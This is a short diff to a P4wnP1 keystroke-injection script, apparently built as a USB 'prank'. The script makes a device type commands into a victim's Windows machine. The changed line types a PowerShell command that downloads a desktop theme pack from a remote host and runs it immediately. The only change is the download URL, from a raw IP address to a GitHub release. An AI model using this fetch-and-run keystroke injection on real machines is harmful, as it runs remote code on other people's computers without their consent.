@@ -313,7 +313,7 @@ delay(300);
 press("ENTER");
 delay(300);
 typingSpeed(10,10);
-type('Invoke-WebRequest -Uri "http://51.68.46.135:8000/JeremPrankV2.deskthemepack" -OutFile "jeremPrank.deskthemepack" ; ./jeremPrank.deskthemepack');
+type('Invoke-WebRequest -Uri "https://github.com/MrNonoss/P4wnp1_Prank/releases/download/V2/JeremPrankV2.deskthemepack" -OutFile "jeremPrank.deskthemepack" ; ./jeremPrank.deskthemepack');
 typingSpeed(50,100);
 delay(500);
 press("ENTER");
